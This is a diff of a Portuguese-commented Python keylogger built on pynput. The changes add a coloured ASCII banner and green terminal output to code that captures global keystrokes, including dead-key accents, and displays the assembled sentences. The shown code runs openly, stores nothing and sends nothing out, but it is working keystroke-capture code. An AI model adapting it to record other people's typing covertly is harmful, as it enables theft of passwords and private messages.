@@ -1,4 +1,33 @@
 from pynput import keyboard
+import os
+import time
+
+# Cores ANSI
+GREEN = "\033[92m"
+RESET = "\033[0m"
+BOLD = "\033[1m"
+
+def exibir_banner():
+    os.system("cls" if os.name == "nt" else "clear")
+    banner = f"""
+{GREEN}{BOLD}
+       💻  ============================================ 💻
+         ____                 _                       _            
+        |  _ \\  ___  ___  ___| |__   __ _ _ __   __ _| |_ ___  _ __ 
+        | | | |/ _ \\/ __|/ _ \\ '_ \\ / _` | '_ \\ / _` | __/ _ \\| '__|
+        | |_| |  __/\\__ \\  __/ |_) | (_| | | | | (_| | || (_) | |   
+        |____/ \\___||___/\\___|_.__/ \\__,_|_| |_|\\__,_|\\__\\___/|_|   
+                                                                    
+       💻  ============================================ 💻
+
+               Keylogger Python no Terminal
+       Criado por Paulo Henrique Azevedo do Nascimento
+
+     [!] Pressione ESC a qualquer momento para encerrar
+{RESET}
+"""
+    print(banner)
+    time.sleep(1.2)
 
 class KeyLogger:
     def __init__(self):
@@ -18,7 +47,6 @@ class KeyLogger:
             if hasattr(key, 'char') and key.char is not None:
                 char = key.char
 
-                # Verifica se é uma tecla morta (dead key)
                 if char in ['´', '`', '~', '^', '¨', "'"]:
                     self.dead_key = char
                 else:
@@ -27,35 +55,35 @@ class KeyLogger:
                         if combo:
                             self.current_sentence += combo
                         else:
-                            # Se não existir no mapa, adiciona os dois
                             self.current_sentence += self.dead_key + char
                         self.dead_key = None
                     else:
                         self.current_sentence += char
 
-                print("\rFrase atual: " + self.current_sentence + " ", end="", flush=True)
+                print(f"\r{GREEN}Frase atual: {self.current_sentence} {RESET}", end="", flush=True)
 
             elif key == keyboard.Key.space:
                 self.current_sentence += " "
-                print("\rFrase atual: " + self.current_sentence + " ", end="", flush=True)
+                print(f"\r{GREEN}Frase atual: {self.current_sentence} {RESET}", end="", flush=True)
 
             elif key == keyboard.Key.backspace:
                 self.current_sentence = self.current_sentence[:-1]
-                print("\rFrase atual: " + self.current_sentence + " ", end="", flush=True)
+                print(f"\r{GREEN}Frase atual: {self.current_sentence} {RESET}", end="", flush=True)
 
             elif key == keyboard.Key.enter:
-                print(f"\nFrase registrada: {self.current_sentence}")
+                print(f"\n{GREEN}Frase registrada: {self.current_sentence}{RESET}")
                 self.current_sentence = ""
 
             elif key == keyboard.Key.esc:
-                print("\nEncerrando...")
+                print(f"\n{GREEN}Encerrando...{RESET}")
                 return False
 
         except Exception as e:
-            print(f"\n[ERRO] {e}")
+            print(f"\n{GREEN}[ERRO] {e}{RESET}")
 
     def start(self):
-        print("🟢 Keylogger rodando em segundo plano. Pressione ESC para sair.")
+        exibir_banner()
+        print(f"{GREEN}🟢 Keylogger rodando em segundo plano. Pressione ESC para sair.{RESET}")
         with keyboard.Listener(on_press=self.on_press) as listener:
             listener.join()
 
